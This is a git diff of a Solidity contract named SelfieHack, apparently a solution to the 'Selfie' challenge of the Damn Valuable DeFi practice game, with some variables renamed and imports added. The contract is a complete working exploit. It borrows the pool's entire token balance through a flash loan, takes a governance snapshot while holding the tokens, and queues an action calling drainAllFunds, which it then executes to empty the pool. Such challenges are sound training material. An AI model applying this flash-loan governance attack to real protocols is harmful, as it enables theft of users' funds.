@@ -1,32 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "../DamnValuableTokenSnapshot.sol";
 import "../selfie/SelfiePool.sol";
+import "../selfie/SimpleGovernance.sol";
 
 contract SelfieHack {
     DamnValuableTokenSnapshot public token;
     SelfiePool public pool;
-    SimpleGovernance public gov;
+    SimpleGovernance public governance;
 
-    uint256 actionId;
+    uint256 public actionId;
 
-    constructor(address _token, address _pool, address _gov) {
+    constructor(address _token, address _pool, address _governance) {
         token = DamnValuableTokenSnapshot(_token);
         pool = SelfiePool(_pool);
-        gov = SimpleGovernance(_gov);
+        governance = SimpleGovernance(_governance);
     }
 
-    receive() external payable {}
-
-    fallback() external payable {
+    fallback() external {
         token.snapshot();
         token.transfer(address(pool), token.balanceOf(address(this)));
     }
 
     function attack() external {
         pool.flashLoan(token.balanceOf(address(pool)));
-
-        actionId = gov.queueAction(
+        // This will run after the snapshot
+        actionId = governance.queueAction(
             address(pool),
             abi.encodeWithSignature(
                 "drainAllFunds(address)",
@@ -37,6 +37,6 @@ contract SelfieHack {
     }
 
     function attack2() external {
-        gov.executeAction(actionId);
+        governance.executeAction(actionId);
     }
 }
